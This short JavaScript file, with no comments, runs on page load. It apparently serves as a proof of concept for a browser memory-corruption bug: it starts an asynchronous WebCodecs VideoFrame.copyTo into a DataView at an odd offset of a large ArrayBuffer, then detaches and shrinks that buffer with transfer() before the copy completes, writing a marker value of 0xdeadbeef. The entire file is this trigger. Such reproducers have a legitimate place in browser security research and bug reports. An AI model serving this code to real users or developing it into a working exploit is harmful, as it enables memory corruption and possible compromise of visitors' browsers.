async function main() {
  cnv = new OffscreenCanvas(1, 1);
  ctx = cnv.getContext('2d', {
    alpha: false
  });
  im = ctx.createImageData(1, 1);
  new Uint32Array(im.data.buffer)[0] = 0xdeadbeef;
  ctx.putImageData(im, 0, 0);
  vf = new VideoFrame(cnv, {
    timestamp: 1
  });
  ab = new ArrayBuffer(0x100000);
  prom = vf.copyTo(new DataView(ab, 0x13337, 4));
  ab.transfer(1);
  await prom;
}

window.onload = main;